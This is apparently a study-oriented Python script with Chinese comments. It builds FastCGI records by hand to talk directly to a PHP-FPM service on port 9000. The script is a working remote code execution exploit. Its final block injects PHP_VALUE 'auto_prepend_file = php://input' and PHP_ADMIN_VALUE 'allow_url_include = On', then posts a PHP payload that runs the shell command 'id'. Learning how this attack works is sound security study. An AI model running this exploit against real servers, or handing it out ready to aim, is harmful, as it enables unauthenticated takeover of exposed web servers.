#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket
import random
import argparse
import sys
from io import BytesIO
import urllib


class FPM_Client_Header(object):

    # 可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。
    # 网络序中为大端。

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.__version = 1
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def socket_connect(self):

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True
    def convert_char_bin(self,i):
        return bytes([i])
    def force_bytes(self,s):
        # 如果是字节格式那就直接返回字节，否则返回utf-8编码格式
        if isinstance(s, bytes):
            return s
        else:
            return s.encode('utf-8', 'strict')

    def bord(self,c):
        if isinstance(c, int):
            return c
        else:
            return ord(c)

    def param_record(self,name,value):
        # 这里对应后端解析 record 结构体
        nname = len(name)
        vvalue = len(value)
        FCGI_NameValuePair11 = b''
        if nname < 128:
            FCGI_NameValuePair11+=self.convert_char_bin(nname)
        else:
            FCGI_NameValuePair11+=self.convert_char_bin((nname >> 24) | 0x80)
            FCGI_NameValuePair11+=self.convert_char_bin((nname >> 16) & 0xff)
            FCGI_NameValuePair11+=self.convert_char_bin((nname >> 8) & 0xff)
            FCGI_NameValuePair11+=self.convert_char_bin((nname) & 0xff)

        if vvalue < 128:
            FCGI_NameValuePair11+=self.convert_char_bin(vvalue)
        else:
            FCGI_NameValuePair11 += self.convert_char_bin((vvalue >> 24) | 0x80)
            FCGI_NameValuePair11 += self.convert_char_bin((vvalue >> 16) & 0xff)
            FCGI_NameValuePair11 += self.convert_char_bin((vvalue >> 8) & 0xff)
            FCGI_NameValuePair11 += self.convert_char_bin((vvalue) & 0xff)
        return FCGI_NameValuePair11 + name + value
        # 这里对应的是FCGI_NameValuePair11结构体，（type：4）参考：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
    def cgi_recode(self,type,content,request,version):
        contentlength = len(content)
        recode = self.convert_char_bin(version) \
        +self.convert_char_bin(type) \
        +self.convert_char_bin((request >> 8) & 0xff) \
        + self.convert_char_bin(request & 0xff) \
        + self.convert_char_bin((contentlength >> 8) & 0xff) \
        + self.convert_char_bin(contentlength & 0xff) + self.convert_char_bin(0) \
        + self.convert_char_bin(0) \
        + content
        return recode
    def decode_fcgi_header(self,stream):
        header = dict()
        header['version'] = self.bord(stream[0])
        header['type'] = self.bord(stream[1])
        header['requestId'] = (self.bord(stream[2]) << 8) + self.bord(stream[3])
        header['contentLength'] = (self.bord(stream[4]) << 8) + self.bord(stream[5])
        header['paddingLength'] = self.bord(stream[6])
        header['reserved'] = self.bord(stream[7])
        return header
    def decode_fcgi_recode(self,buffer):
        header_buffer = buffer.read(8) #读取header长度8
        header = self.decode_fcgi_header(header_buffer)
        response = b''
        if 'contentLength' in header.keys():
            contentlength = header['contentLength']
            response += buffer.read(contentlength)
        return response
    def response_unsocket(self):
        data = b''
        while True:
            buffer = self.sock.recv(500)
            if not len(buffer):
                break
            data += buffer
        data = BytesIO(data)
        response = self.decode_fcgi_recode(data)
        if response:
            return response.decode('utf-8')  #我这里解码成utf-8
        else:
            return 'fail'
    def request(self,param = {},post=''):
        requestId = random.randint(1, (1 << 16) - 1)
        if not self.socket_connect():
            print('连接错误')
            return
        request = b""
        # socketalive false
        FCGI_BEGIN_REQUEST = self.convert_char_bin(0) \
        + self.convert_char_bin(1) \
        + self.convert_char_bin(0) \
        + self.convert_char_bin(0) \
        + self.convert_char_bin(0) \
        + self.convert_char_bin(0) \
        + self.convert_char_bin(0) \
        + self.convert_char_bin(0)

        request += self.cgi_recode(1,FCGI_BEGIN_REQUEST,requestId,self.__version)
        # 0x01 请求头部（8个字节）、0x02 params参数、0x03 POST消息体
        paramsRecord = b''
        if param:
            # request += self.cgi_recode()
            for (name,value) in param.items():
                name = self.force_bytes(name)
                value = self.force_bytes(value)
                paramsRecord += self.param_record(name,value)
        if paramsRecord:
            request+=self.cgi_recode(4,paramsRecord,requestId,self.__version)
        request += self.cgi_recode(4, b'', requestId, self.__version) #标志着FCGI_PARAMS 结束。
        if post:
            request+=self.cgi_recode(5,self.force_bytes(post),requestId,self.__version)
        request += self.cgi_recode(5, b'', requestId, self.__version) #标志着FCGI_STDIN（POST） 消息体结束
        self.sock.send(request)
        print(self.response_unsocket())
        # test = self.sock.recv(1)

        # print(type(self.bord(test)))
        # print(str(test,'','strict'))


# FCGI_BEGIN_REQUEST 参考：https://blog.csdn.net/zhang197093/article/details/78914509
# 对于 FCGI_BEGIN_REQUEST 和  FCGI_END_REQUEST 消息类型，fastcgi协议分别定义了一个结构体如下，而对于其他类型的消息体，没有专门结构体与之对应，消息体就是普通的二进制数据。
# 官方：https://fastcgi-archives.github.io/FastCGI_Specification.html
test = FPM_Client_Header('127.0.0.1',9000,20,0)
DOCUMENT_ROOT = "/var/www/html/"
URI = 'index.php'
POST = "<?php echo`id`?>"
params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': DOCUMENT_ROOT + URI,
        'SCRIPT_NAME': URI,
        'QUERY_STRING': '',
        'REQUEST_URI': URI,
        'DOCUMENT_ROOT': DOCUMENT_ROOT,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(POST),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On',
        'aaa':'AAAAA'
    }
test.request(params,POST)

